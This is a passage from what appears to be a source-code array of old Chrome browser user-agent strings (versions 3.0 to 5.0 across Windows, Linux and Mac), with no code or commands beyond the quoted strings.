"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2",
"Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.308.0 Safari/532.9",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.11 Safari/532.9",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.1 Safari/532.9",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1025 Safari/532.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.288.1 Safari/532.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
"Mozilla/5.0 (X11; U; Slackware Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.30 Safari/532.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; it-IT) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.25 Safari/532.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.246.0 Safari/532.5",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.241.0 Safari/532.4",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.4 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.3 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) Chrome/4.0.223.3 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.0 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.8 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.7 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.12 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.1 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.0 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.7 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.3 Safari/532.2",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.0 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.220.1 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.5 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.4 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.0 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.1 Safari/532.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.1 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.1",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.7 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.7 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.210.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.210.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.205.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0 (x86_64); de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/525.13.",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.201.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0",
